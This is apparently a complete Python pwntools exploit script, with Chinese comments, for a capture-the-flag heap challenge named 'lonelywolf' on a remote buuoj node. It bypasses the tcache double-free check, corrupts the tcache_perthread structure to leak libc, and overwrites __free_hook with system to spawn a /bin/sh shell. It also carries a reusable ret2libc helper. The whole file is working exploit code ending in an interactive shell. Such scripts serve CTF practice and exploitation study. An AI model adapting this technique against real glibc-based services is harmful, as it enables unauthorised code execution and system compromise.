from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './lonelywolf'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',29002) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
libc = ELF('/home/javayuan/pwn_libc合集/Ubuntu19_64/libc-2.29.so')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(size):
    index = 0
    sla(b'Your choice: ',b'1')
    sla(b'Index: ',int2bytes(index))
    sla(b'Size: ',int2bytes(size))

def edit(content):
    index = 0
    sla(b'Your choice: ',b'2')
    sla(b':',int2bytes(index))
    sla(b'Content: ',content)

def show():
    index = 0
    sla(b'Your choice: ',b'3')
    sla(b':',int2bytes(index))


def delete():
    index = 0
    sla(b'Your choice: ',b'4')
    sla(b':',int2bytes(index))

#leak heap addr
add(0x78)
delete()
edit(b'a'*0x10) #绕过tcache double free的检测
delete()
show()
ru(b'Content: ')
heap_addr = uu64(ru(b'\n',drop=True))
log.success('heap_addr '+hex(heap_addr))

#alloc to tcache head
head = heap_addr - 0x250
add(0x78)
edit(p64(head))
add(0x78)
add(0x78)

#free head --> leak libc

# 把0x250大小的chunk->第37个count改为0xff即-1，然后就会直接进入unsorted_bin
payload = p64(0) * 4 + p64(0x00000000ff000000)
edit(payload)

delete()
show()
ru(b'Content: ')
libc_base = uu64(ru('\x7f',drop=False)[-6:]) - 96 - 0x10 - libc.sym['__malloc_hook']
log.success('libc_base '+ hex(libc_base))
system_addr = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']


#alloc to free_hook-0x8

#tcache_perthread的前64个字节分别用于存储64个size的count
add(0x40)
edit(p64(0)*4)

#因为chunk的prev_size和size各占八个字节，即一个指针的大小，所以edit的内容会从tcache_0x40开始
# tcache——0x20，0x30分别是prev_size和size
add(0x10)
edit(p64(free_hook-8)*2)
add(0x30)
edit(b'/bin/sh\x00'+p64(system_addr))


#触发free_hook
delete()
itr()
# end

